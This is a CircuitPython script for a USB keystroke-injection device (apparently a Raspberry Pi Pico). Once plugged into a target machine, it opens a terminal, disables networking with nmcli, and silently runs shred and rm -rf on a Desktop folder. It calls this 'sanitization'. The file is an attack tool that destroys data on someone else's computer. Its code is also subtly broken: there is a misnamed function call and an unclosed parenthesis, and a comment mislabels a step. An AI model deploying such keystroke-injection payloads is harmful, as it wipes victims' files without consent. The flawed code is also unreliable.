# used to delete whole file directories through the terminal of target device
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def type_cmd(text):
    layout.write(text)
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)

def kill_network():
	# Open terminal
	type_cmd("nmcli networking off > /dev/null 2>&1 & exit")

# 1. Open terminal
kbd.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
kbd.release_all()
time.sleep(0.5) # Change time to longer for slower devices

Kill_network()

# 2. Enter the target folder
type_cmd("cd ~/Desktop/PicoWTest"

# 3. Shred all the files inside the first! (Overwrites data)
type_cmd("shred -vzu -n 1 * > /dev/null 2>&1")

# 4. Go back up and remove the now-empty, shredded folder, and exit
# Note: && ensures that the rm -rf only works if the shredding actually happens
type_cmd("cd .. && rm -rf PicoWTest & exit")

print("Sanitization Complete!")
